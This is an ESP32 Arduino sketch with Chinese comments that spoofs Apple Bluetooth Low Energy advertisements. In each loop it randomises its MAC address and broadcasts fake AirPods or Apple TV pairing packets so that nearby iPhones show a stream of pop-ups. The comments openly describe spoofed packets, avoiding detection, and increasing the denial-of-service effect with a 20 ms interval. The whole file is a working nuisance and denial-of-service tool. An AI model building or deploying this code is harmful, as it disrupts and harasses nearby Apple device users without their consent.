// 这个例子在很大程度上受到了ronaldstoner的ESP32示例的启发
// 基于chipik / _hexway / ECTO-1A＆SAY-10的先前工作
// 详细信息请参阅README
#include <Arduino.h>

#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>

#include <devices.h>

BLEAdvertising *pAdvertising;
uint32_t delayMilliseconds = 1000;

void setup() {
  Serial.begin(115200);
  Serial.println("Starting ESP32 BLE");

  // 这是特定于AirM2M ESP32板的
  // https://wiki.luatos.com/chips/esp32c3/board.html
  pinMode(12, OUTPUT);
  pinMode(13, OUTPUT);

  BLEDevice::init("AirPods 69");

  // 创建BLE服务器
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();

  // 似乎我们需要在setup()步骤中用一个地址初始化它。
  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
}

void loop() {
  // 在“繁忙”部分打开灯光
  digitalWrite(12, HIGH);
  digitalWrite(13, HIGH);

  // 首先生成虚假的随机MAC地址
  esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  for (int i = 0; i < 6; i++){
    dummy_addr[i] = random(256);

  // 似乎由于某种原因，前4位需要是高位（即0b1111），因此我们用0xF0进行OR运算。
    if (i == 0){
      dummy_addr[i] |= 0xF0;
    }
  }

  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  // 随机选择设备数据
  // 0 = long (耳机), 1 = short (杂项，例如Apple TV)
  int device_choice = random(2);
  if (device_choice == 0){
    int index = random(17);
    oAdvertisementData.addData(std::string((char*)DEVICES[index], 31));
  } else {
    int index = random(12);
    oAdvertisementData.addData(std::string((char*)SHORT_DEVICES[index], 23));
  }

  /* 苹果的《Apple设备附件设计指南（发布版本R20）》第191页建议在连接到Apple设备时仅使用三种广播PDU类型之一。
      // 0 = ADV_TYPE_IND, 
      // 1 = ADV_TYPE_SCAN_IND
      // 2 = ADV_TYPE_NONCONN_IND
      
      随机使用这些PDU类型之一可能会增加欺骗数据包的检测性。

      我们确定的信息：
      - AirPods第2代：当盖子打开时广播ADV_TYPE_SCAN_IND数据包，并在配对模式下（按住后盖按钮时）广播ADV_TYPE_NONCONN_IND。
                        如果要专门针对AirPods第2代，请考虑仅使用这些PDU类型。
  */
  
  int adv_type_choice = random(3);
  if (adv_type_choice == 0){
    pAdvertising->setAdvertisementType(ADV_TYPE_IND);
  } else if (adv_type_choice == 1){
    pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
  } else {
    pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
  }

  // 设置设备地址，广播数据
  pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
  pAdvertising->setAdvertisementData(oAdvertisementData);
  
  // 设置广告间隔
  /* 根据苹果的技术Q&A QA1931（https://developer.apple.com/library/archive/qa/qa1931/_index.html），苹果建议
        对于希望最大化其BLE配件被iOS发现的开发人员，使用广告间隔为20毫秒。
        
        这些代码行将间隔固定为20毫秒。启用这些可能会增加DoS的效果。请注意，这尚未经过彻底测试。
  */

  //pAdvertising->setMinInterval(0x20);
  //pAdvertising->setMaxInterval(0x20);
  //pAdvertising->setMinPreferred(0x20);
  //pAdvertising->setMaxPreferred(0x20);

  // 开始广播
  Serial.println("Sending Advertisement...");
  pAdvertising->start();

  // 在休眠的时候关灯
  digitalWrite(12, LOW);
  digitalWrite(13, LOW);
  delay(delayMilliseconds); // 延迟
  pAdvertising->stop();
}